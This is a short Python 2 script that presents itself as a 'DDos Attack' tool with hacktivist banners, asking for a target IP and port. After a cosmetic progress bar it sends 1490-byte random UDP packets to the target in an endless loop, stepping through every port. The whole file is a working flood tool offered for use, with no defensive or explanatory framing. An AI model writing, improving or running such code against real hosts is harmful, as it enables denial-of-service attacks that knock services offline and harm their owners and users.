 
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "\033[0;34mFREE-PALESTINE"
time.sleep(2)
print "\033[0;31mTeam-MAROOCO"
time.sleep(2)
print "\033[0;33m#GazaUnderAttack"
time.sleep(2)
print "\033[0;37mplase wait..."
time.sleep(6)
os.system("clear")
                 
print
ip = raw_input("\033[0;35mIP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "\033[0;34m[                    ]  0%"
time.sleep(2)
print "[=====               ]  30%"
time.sleep(2)
print "[==========          ]  60%"
time.sleep(2)
print "[===============     ]  80%"
time.sleep(2)
print "[====================]  100%"
time.sleep(2)
           
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

print "Thaks pro"
